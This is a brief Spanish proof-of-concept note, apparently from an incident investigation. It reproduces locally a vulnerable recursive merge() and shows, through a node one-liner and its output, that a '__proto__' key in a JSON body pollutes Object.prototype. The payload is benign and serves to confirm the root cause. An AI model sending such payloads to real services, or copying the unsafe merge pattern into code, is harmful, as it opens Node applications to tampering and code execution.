# PoC local — contaminación de prototipo con la misma función merge()

Se replicó localmente la función `merge()` confirmada tras el RCE y se ejecutó
con el mismo tipo de objeto que acepta `POST /api/profile`.

```bash
node -e '
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === "object" && source[key] !== null) {
      if (typeof target[key] !== "object" || target[key] === null) {
        target[key] = {};
      }
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
}
merge({}, JSON.parse("{\"__proto__\":{\"theme\":\"pwned\"}}"));
console.log("Object.prototype.theme =", ({}).theme);
'
```

Salida:

```text
Object.prototype.theme = pwned
```

Esto confirma que la clave `__proto__` del JSON llega como propiedad propia,
`target["__proto__"]` resuelve a `Object.prototype`, y la recursión escribe en
el prototipo global del proceso Node.
